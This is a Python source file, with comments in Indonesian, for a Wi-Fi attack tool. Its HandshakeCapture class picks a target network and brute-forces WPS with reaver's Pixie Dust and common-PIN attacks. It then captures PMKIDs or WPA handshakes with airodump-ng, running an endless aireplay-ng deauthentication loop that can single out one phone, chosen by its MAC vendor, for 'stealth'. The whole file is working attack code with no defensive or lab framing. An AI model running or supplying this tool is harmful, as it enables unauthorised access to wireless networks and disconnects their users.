import os, sys, time, subprocess, re

class HandshakeCapture:
    def __init__(self, manager, colors):
        self.manager = manager
        self.colors = colors
        self.common_pins = ["00000000", "12345670", "88888888", "56789012", "11111111"]

    def _check_handshake(self, cap_file):
        """Verifier: Cek apakah file .cap berisi Handshake atau PMKID"""
        if not os.path.exists(cap_file): return False
        try:
            cmd = ["aircrack-ng", cap_file]
            proc = subprocess.run(cmd, capture_output=True, text=True)
            output = proc.stdout.lower()
            if "1 handshake" in output or "wpa (1)" in output or "pmkid" in output:
                return True
        except: pass
        return False

    def _get_vendor(self, mac):
        """Mencoba mencari merk HP berdasarkan MAC Address"""
        try:
            vendors = {
                "Apple": ["74:AC:5F", "28:CF:E9", "D0:22:BE", "F0:D1:A9", "64:A3:CB"],
                "Samsung": ["BC:47:60", "34:FC:EF", "A8:7D:12", "DC:E5:5B", "50:85:69"],
                "Oppo": ["7C:38:AD", "E4:47:90", "D4:A4:15", "50:33:8B", "6C:5C:14"],
                "Vivo": ["F4:29:81", "70:AF:25", "BC:6E:64", "44:91:60", "20:47:ED"],
                "Xiaomi": ["28:6C:07", "64:CC:2E", "AC:F7:F3", "98:22:EF", "D8:BB:C1"],
                "Realme": ["0C:D7:46", "34:6F:90", "F0:19:AF"],
                "Infinix": ["38:5B:44", "00:08:22", "9C:34:21"],
                "Huawei": ["00:E0:FC", "24:DF:6A", "80:B6:86"],
                "Asus": ["08:60:6E", "54:A0:50", "D0:17:C2"]
            }
            prefix = mac[:8].upper().replace("-", ":")
            for name, prefixes in vendors.items():
                if prefix in prefixes: return name
            return "Unknown Device"
        except: return "Device"

    def _get_clients(self, bssid, channel, iface):
        """Ngintip klien yang aktif dan deteksi merk HP-nya"""
        c = self.colors
        print(f"\n  {c.INFO} Scanning for active clients on {bssid} (10s)...")
        temp_file = "/tmp/client_scan"
        scan_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", temp_file, "--output-format", "csv", iface]
        proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        
        try:
            time.sleep(10)
        finally:
            proc.terminate()
            proc.wait()

        clients_data = []
        csv_path = f"{temp_file}-01.csv"
        if os.path.exists(csv_path):
            with open(csv_path, 'r') as f:
                content = f.read()
                if "Station MAC" in content:
                    stations_part = content.split("Station MAC")[1]
                    for line in stations_part.strip().split("\n"):
                        cols = line.split(",")
                        if len(cols) > 0:
                            mac = cols[0].strip()
                            if re.match(r"([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})", mac):
                                vendor = self._get_vendor(mac)
                                clients_data.append({"mac": mac, "vendor": vendor})
            os.remove(csv_path)
        return clients_data

    def start_capture(self, targets):
        c = self.colors
        if not targets:
            print(f"\n{c.ERR} Target list empty!{c.NC}"); return

        # --- SELECT TARGET ---
        try:
            if len(targets) == 1:
                target = targets[0]
                print(f"\n{c.OK} Auto-selecting: {c.Y}{target.get('essid')}{c.NC}")
            else:
                val = input(f"\n{c.Q} Select Target ID (1-{len(targets)}): ").strip()
                target = targets[int(val)-1]
        except: return

        bssid = target['bssid']
        channel = target['ch']
        essid = target.get('essid', 'Unknown').replace(" ", "_")
        wps_status = target.get('wps', 'no').lower()
        iface = self.manager.iface

        # --- PILIH MODE DEAUTH (ANTI-GEBUK) ---
        print(f"\n  {c.BOLD}{c.W}DEAUTH MODE:{c.NC}")
        print(f"  [{c.C}1{c.NC}] Broadcast (Kick All - High Risk)")
        print(f"  [{c.C}2{c.NC}] Targeted  (Kick One - Stealth)")
        mode = input(f"\n  {c.Q} Choice (1/2): ").strip()

        client_mac = None
        if mode == "2":
            clients = self._get_clients(bssid, channel, iface)
            if not clients:
                print(f"  {c.ERR} No clients found! Defaulting to Broadcast.")
            else:
                print(f"\n  {c.W}Active Clients:{c.NC}")
                for i, obj in enumerate(clients):
                    print(f"  [{c.C}{i+1}{c.NC}] {c.G}{obj['vendor']}{c.NC} ({obj['mac']})")
                try:
                    c_idx = input(f"\n  {c.Q} Select Client ID: ").strip()
                    client_mac = clients[int(c_idx)-1]['mac']
                except: client_mac = None

        # --- SETUP OUTPUT ---
        output_dir = "captures"
        if not os.path.exists(output_dir): os.makedirs(output_dir)
        output_base = f"{output_dir}/{essid}_{bssid.replace(':', '')}"
        cap_file = f"{output_base}-01.cap"

        try:
            # PHASE 0: WPS
            if wps_status != 'no':
                print(f"\n  {c.OK} {c.G}Phase 0: Testing WPS...{c.NC}")
                # Pixie Dust
                subprocess.run(["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-K", "1", "-f"], timeout=20, stdout=subprocess.DEVNULL)
                # Common PINs
                for pin in self.common_pins:
                    sys.stdout.write(f"\r    {c.W}Testing PIN: {c.Y}{pin}{c.NC} ")
                    sys.stdout.flush()
                    subprocess.run(["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-p", pin, "-f"], timeout=5, stdout=subprocess.DEVNULL)

            # START SNIFFER
            cap_proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", output_base, iface], stdout=subprocess.DEVNULL)

            # PHASE 1: PMKID (15s)
            for i in range(15, 0, -1):
                sys.stdout.write(f"\r  {c.OK} {c.W}Phase 1: PMKID {c.Y}[{i:02d}s]{c.NC} ")
                sys.stdout.flush()
                if self._check_handshake(cap_file):
                    print(f"\n\n  {c.OK} {c.G}PMKID Captured!{c.NC}"); return
                time.sleep(1)

            # PHASE 2: DEAUTH
            print(f"\n  {c.WARN} Starting Deauth Loop...")
            deauth_cmd = ["aireplay-ng", "-0", "5", "-a", bssid]
            if client_mac: deauth_cmd += ["-c", client_mac]
            deauth_cmd += ["--ignore-negative-one", iface]

            count = 0
            while True:
                count += 1
                sys.stdout.write(f"\r  {c.OK} Loop [{count:03d}] | Waiting Handshake... ")
                sys.stdout.flush()
                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                if self._check_handshake(cap_file):
                    print(f"\n\n  {c.OK} {c.G}Handshake Captured!{c.NC}"); break
                time.sleep(10)

        except KeyboardInterrupt: print(f"\n\n  {c.ERR} Aborted.{c.NC}")
        finally:
            if 'cap_proc' in locals(): cap_proc.terminate()
            self.manager.set_managed_mode(iface)
            print(f"  {c.OK} {c.G}Cleanup Done.{c.NC}")
